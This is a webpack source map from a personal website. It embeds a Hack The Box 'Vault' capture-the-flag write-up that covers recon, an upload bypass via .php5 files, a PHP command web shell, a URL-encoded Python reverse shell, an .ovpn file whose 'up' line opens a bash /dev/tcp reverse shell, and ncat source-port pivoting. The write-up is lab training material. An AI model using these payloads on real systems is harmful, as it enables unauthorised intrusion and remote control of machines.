{"version":3,"file":"js/822.c5901aff.js","mappings":"olCAAKA,MAAM,qB,GAAXC,EAAAA,EAAAA,IAAAA,maAAAA,EAAAA,0IAAAA,EAAAA,6eAAAA,EAAAA,gJAAAA,EAAAA,oJAAAA,EAAAA,oIAAAA,EAAAA,2EAAAA,EAAAA,gNAAAA,EAAAA,8GAAAA,EAAAA,sOAAAA,EAAAA,ydAAAA,EAAAA,yDAAAA,EAAAA,2EAAAA,EAAAA,wCAAAA,EAAAA,oJAAAA,EAAAA,iRAAAA,EAAAA,iKAAAA,EAAAA,+IAAAA,EAAAA,koBAAAA,EAAAA,2HAAAA,EAAAA,6FAAAA,EAAAA,wCAAAA,EAAAA,6+BAAAA,EAAAA,06BAAAA,EAAAA,kFAAAA,EAAAA,kKAAAA,EAAAA,0SAAAA,EAAAA,mTAAAA,I,GAA+BC,G,kCAA/BC,EAAAA,EAAAA,IAuJM,MAvJNC,EAAAC,E,eCCA,MAAMC,EAAS,CAAC,EAGVC,GAA2B,OAAgBD,EAAQ,CAAC,CAAC,SAASE,KAEpE,O","sources":["webpack://personal_website/./src/components/notes/ctfwriteup/HTB/Medium/Vault/Writeup.md","webpack://personal_website/./src/components/notes/ctfwriteup/HTB/Medium/Vault/Writeup.md?df1f"],"sourcesContent":["<template><div class=\"component-writeup\"><h1>Recon</h1>\n<h2>Nmap</h2>\n<pre v-pre=\"\"><code>nmap -Pn -v -p- -sV --min-rate 1000 vault.htb -oN vault_nmap.txt\n</code></pre>\n<pre v-pre=\"\"><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n</code></pre>\n<h1>Foothold (Port 80)</h1>\n<p>Main page hints there is possibly a directory related to “sparklays”\n<img src=\"./Screenshots/image_1.png\" alt=\"Screenshots\">\nTurns out there is a directory under <a href=\"http://vault.htb/sparklays\">http://vault.htb/sparklays</a>\n<img src=\"./Screenshots/image_1_1.png\" alt=\"Screenshots\"></p>\n<p>Fuzzing with Gobuster</p>\n<pre v-pre=\"\"><code>gobuster dir -u http://vault.htb/sparklays -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php -o vault.htb_sparklays.txt\n</code></pre>\n<p>Subdirectory in sparklays/design</p>\n<pre v-pre=\"\"><code>gobuster dir -u http://vault.htb/sparklays/design -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php -o vault.htb_sparklays_design.txt\n</code></pre>\n<p><img src=\"./Screenshots/image_3.png\" alt=\"Screenshots\"></p>\n<p>Found admin login page at admin.php</p>\n<pre v-pre=\"\"><code>http://vault.htb/sparklays/admin.php\n</code></pre>\n<p><img src=\"./Screenshots/image_2.png\" alt=\"Screenshots\"></p>\n<p>Another page names design.html</p>\n<pre v-pre=\"\"><code>http://vault.htb/sparklays/design/design.html\n</code></pre>\n<p><img src=\"./Screenshots/image_4.png\" alt=\"Screenshots\">\nThe link leads to</p>\n<pre v-pre=\"\"><code>http://vault.htb/sparklays/design/changelogo.php\n</code></pre>\n<p><img src=\"./Screenshots/image_5.png\" alt=\"Screenshots\"></p>\n<p>Uploading test.png returns success\n<img src=\"./Screenshots/image_5_1.png\" alt=\"Screenshots\"></p>\n<p>And the file can be viewed at</p>\n<pre v-pre=\"\"><code>http://vault.htb/sparklays/design/uploads/&lt;filename&gt;\n</code></pre>\n<p>But uploading test.php returns a failed message\n<img src=\"./Screenshots/image_5_2.png\" alt=\"Screenshots\"></p>\n<p>Fuzzing with Burp Intruder shows that it allows uploading .php5 files\n<img src=\"./Screenshots/image_5_3.png\" alt=\"Screenshots\"></p>\n<p>Uploading a simple file to test code execution with system()</p>\n<pre v-pre=\"\"><code>&lt;?php\necho \"hello\\n\";\nsystem($_GET['cmd']);\n?&gt;\n</code></pre>\n<p>can use system()</p>\n<p><img src=\"./Screenshots/image_6.png\" alt=\"Screenshots\">\nReverse shell from <a href=\"http://revshells.com\">revshells.com</a></p>\n<pre v-pre=\"\"><code># Python3 #2 URL encoded\npython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.24%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22bash%22%29%27\n</code></pre>\n<p><img src=\"./Screenshots/image_7.png\" alt=\"Screenshots\"></p>\n<h1>User.txt</h1>\n<p><img src=\"./Screenshots/image_8.png\" alt=\"Screenshots\"></p>\n<p>SSH password in /home/dave/Desktop\n<img src=\"./Screenshots/image_9.png\" alt=\"Screenshots\"></p>\n<p><img src=\"./Screenshots/image_10.png\" alt=\"Screenshots\">\nFurther enumeration shows:</p>\n<ul>\n<li>IP address for other servers</li>\n<li>A potential password or encryption key\n<img src=\"./Screenshots/image_11.png\" alt=\"Screenshots\"></li>\n</ul>\n<p>No nmap installed, therefore using a bash script to scan for ports (<a href=\"https://github.com/mnorin/bash-scripts/blob/master/utils/portscan.sh\">https://github.com/mnorin/bash-scripts/blob/master/utils/portscan.sh</a>)</p>\n<p><img src=\"./Screenshots/image_12.png\" alt=\"Screenshots\"></p>\n<p>Tunnel to DNS + Configurator server</p>\n<pre v-pre=\"\"><code>ssh -L 8888:192.168.122.4:80 dave@vault.htb\n</code></pre>\n<p>Main page\n<img src=\"./Screenshots/image_13.png\" alt=\"Screenshots\"></p>\n<p>Second link goes to</p>\n<pre v-pre=\"\"><code>http://192.168.122.4/vpnconfig.php?function=testvpn\n</code></pre>\n<p><img src=\"./Screenshots/image_14.png\" alt=\"Screenshots\"></p>\n<p>This suggests that it allows editing and executing a .ovpn file.</p>\n<p>There is a blog post about code execution using ovpn files. (<a href=\"https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da\">https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</a>)</p>\n<p>.ovpn file used</p>\n<pre v-pre=\"\"><code>remote 192.168.122.4\nnobind\ndev tun\nscript-security 2\nup \"/bin/bash -c '/bin/bash -i &gt; /dev/tcp/192.168.122.1/8080 0&lt;&amp;1 2&gt;&amp;1&amp;'\"\n</code></pre>\n<p>The flag is in /home/dave/user.txt\n<img src=\"./Screenshots/image_15.png\" alt=\"Screenshots\"></p>\n<h1>Root.txt</h1>\n<p>SSH password for dave on 192.168.122.4 (DNS) is in home directory\n<img src=\"./Screenshots/image_16.png\" alt=\"Screenshots\"></p>\n<p>Checking /etc/hosts shows the IP of the Vault server\n<img src=\"./Screenshots/image_17.png\" alt=\"Screenshots\"></p>\n<p><img src=\"./Screenshots/image_18.png\" alt=\"Screenshots\"></p>\n<p>Interesting commands to add routes to Vault subnet</p>\n<pre v-pre=\"\"><code>http://192.168.1.11:8888/DNS.zip\n\nroot@DNS:/var/www/DNS# cat interfaces \nauto ens3\niface ens3 inet static\naddress 192.168.122.4\nnetmask 255.255.255.0\nup route add -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5\nup route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28\n</code></pre>\n<p>However, the IP does not seem to be reachable.</p>\n<h1>Checked Writeup (Got Stuck Here)</h1>\n<p>Issue:</p>\n<ul>\n<li>Identified the target IP to pivot to, but cannot seem to reach the server</li>\n</ul>\n<p>Checked writeup at this point (<a href=\"https://0xdf.gitlab.io/2019/04/06/htb-vault.html\">https://0xdf.gitlab.io/2019/04/06/htb-vault.html</a>)</p>\n<p>So by grepping the IP under log files, there are previously ran command that hints on how the users reached the DNS server from Vault</p>\n<pre v-pre=\"\"><code>grep -rHa \"192.168.5.2\" /var/log\n</code></pre>\n<p>Commands previously ran by dave\n<img src=\"./Screenshots/image_19.png\" alt=\"Screenshots\"></p>\n<pre v-pre=\"\"><code>/var/log/auth.log:Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f\n/var/log/auth.log:Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53\n/var/log/auth.log:Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53\n</code></pre>\n<p>Creates a tunnel with a certain source port (as ssh cannot specify source port)</p>\n<ul>\n<li>that’s why nmap returned nothing, as it only allow traffic with src port 53 or 4444</li>\n</ul>\n<pre v-pre=\"\"><code>/usr/bin/ncat -l 1234 --sh-exec \"ncat 192.168.5.2 987 -p 53\" &amp;\n</code></pre>\n<p>Then ssh as dave, same password as before</p>\n<pre v-pre=\"\"><code>ssh dave@127.0.0.1 -p 1234\n</code></pre>\n<p><img src=\"./Screenshots/image_20.png\" alt=\"Screenshots\"></p>\n<p>A root.txt.gpg file in the home directory\n<img src=\"./Screenshots/image_21.png\" alt=\"Screenshots\"></p>\n<p>Listing keys on each host</p>\n<pre v-pre=\"\"><code>gpg --list-keys\n</code></pre>\n<p>There is a key on ubuntu host (first host)</p>\n<p><img src=\"./Screenshots/image_22.png\" alt=\"Screenshots\"></p>\n<p>Copy file from vault to ubuntu using scp</p>\n<pre v-pre=\"\"><code># From vault to DNS\nscp -P 1234 dave@127.0.0.1:~/root.txt.gpg .\n\n# From DNS to ubuntu\nscp dave@192.168.122.4:~/root.txt.gpg .\n</code></pre>\n<p>Decrypt with passphrase shown in /home/dave/Desktop/key\n<img src=\"./Screenshots/image_23.png\" alt=\"Screenshots\"></p>\n<h1>Extra: Shell breakout</h1>\n<p><a href=\"https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e\">https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e</a>\nMethod -3</p>\n<pre v-pre=\"\"><code>ssh dave@127.0.0.1 -p 1234 -t bash\n</code></pre>\n</div></template>","import { render } from \"./Writeup.md?vue&type=template&id=151e5236\"\nconst script = {}\n\nimport exportComponent from \"../../../../../../../node_modules/vue-loader/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render]])\n\nexport default __exports__"],"names":["class","_createStaticVNode","_hoisted_2","_createElementBlock","_hoisted_1","_hoisted_82","script","__exports__","render"],"sourceRoot":""}